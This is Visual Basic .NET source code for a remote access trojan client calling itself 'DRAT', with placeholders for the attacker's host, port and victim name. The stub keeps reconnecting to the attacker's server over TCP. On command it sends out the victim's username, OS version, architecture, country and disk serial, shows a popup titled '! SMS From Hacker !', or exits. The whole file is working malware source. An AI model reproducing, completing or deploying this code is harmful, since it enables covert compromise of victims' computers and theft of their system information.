Imports System.Threading
Imports System.Globalization
Imports System.Net.Sockets


Public Class Form1

#Region "Declaration"
    Public Shared URL As String = "[1]"
    Public Shared PORT As String = "[2]"
    Public Shared vicname As String = "[3]"
    Public Shared EXE As String = "[4]"
    Public SPL As String = "[DRAT]"
    Public HOST As String = GETHost()
    Public F As New Microsoft.VisualBasic.Devices.Computer
    Public WithEvents C As New SocketClient
#End Region

    Function GETHost() As String
        Dim Web As New WebBrowser
        Web.Navigate(URL)
        Do While Web.ReadyState <> WebBrowserReadyState.Complete
            Application.DoEvents()
        Loop
        Return Web.Url.Host
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim tt As Object = New Thread(AddressOf C.Statconnected, 1)
        tt.Start()
        Timer2.Start()
        vicname = vicname & "_" & HWD()
    End Sub

#Region "Socket Events"

    Private Sub Connected() Handles C.Connected
    End Sub

    Private Sub Disconnected() Handles C.Disconnected
        Timer2.Interval = 100
        Timer2.Start()
        C.Connect(HOST, PORT)
    End Sub

    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, SPL)
        Dim Message As String = (BS(b))
        Try
            If A(0) = "GET_INFO" Then
                C.Send("SENT_INFO" & SPL & INF())
            End If
            If A(0) = "SENT_SMS" Then
                MsgBox(A(1), MsgBoxStyle.Information, "! SMS From Hacker !")
            End If
            If A(0) = "SENT_DIS" Then
                End
            End If
        Catch ex As Exception
        End Try

    End Sub

#End Region

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If C.Statconnected = False Then
            C.Connect(HOST, PORT)
        End If
    End Sub

    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Public Function INF() As String
        Dim info As String = vicname & SPL
        Try
            info &= Environment.UserName & SPL
        Catch ex As Exception
            info &= "unknow" & SPL
        End Try
        Try
            info += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            info += "unknow"
        End Try
        info += " SP"
        Try
            Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
            If k.Length = 1 Then
                info &= "0"
            End If
            info &= k(k.Length - 1)
        Catch ex As Exception
            info &= "0"
        End Try
        Try
            If Environment.GetFolderPath(38).Contains("x86") Then
                info += " x64" & SPL
            Else
                info += " x86" & SPL
            End If
        Catch ex As Exception
            info += SPL
        End Try
        info &= country & SPL
        Return info
    End Function
End Class

Public Module Functions
    Public Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
End Module

Public Class SocketClient
    Private C As TcpClient
    Public Event Connected()
    Public Event Disconnected()
    Public Event Data(ByVal b As Byte())
    Private IsBuzy As Boolean = False
    Private SPL As String = "-[DRAT]-"

    Public Function Statconnected() As Boolean
        Try
            If C.Client.Connected = True Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function
    Sub Connect(ByVal h As String, ByVal p As Integer)
        Try
            Try
                If C IsNot Nothing Then
                    C.Close()
                    C = Nothing
                End If
            Catch ex As Exception
            End Try
            Do Until IsBuzy = False
                Thread.Sleep(1)
            Loop
            Try
                C = New TcpClient

                C.Connect(h, p)
                Dim t As New Threading.Thread(AddressOf RC, 10)
                t.Start()
                RaiseEvent Connected()
            Catch ex As Exception
            End Try
        Catch ex As Exception
            RaiseEvent Disconnected()
        End Try
    End Sub

    Sub DisConnect()
        Try
            C.Close()
        Catch ex As Exception
        End Try
        C = Nothing
        RaiseEvent Disconnected()
    End Sub
    Sub Send(ByVal s As String)
        Send(SB(s))
    End Sub
    Sub Send(ByVal b As Byte())
        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
        Catch ex As Exception
            DisConnect()
        End Try
    End Sub
    Private Sub RC()
        IsBuzy = True
        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0
re:
        Thread.Sleep(1)

        Try
            If C Is Nothing Then
                GoTo co
            Else
                If C.Client.Connected = False Then
                    GoTo co
                Else
                    cc += 1
                    If cc > 100 Then
                        cc = 0
                        Try
                            If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                GoTo co
                            End If
                        Catch ex As Exception
                            GoTo co
                        End Try
                    End If

                End If
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then
                    Dim A As Array = fx(M.ToArray, SPL)
                    RaiseEvent Data(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        Thread.Sleep(1)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo co
        End Try
        GoTo re
co:
        IsBuzy = False
        DisConnect()
    End Sub
End Class








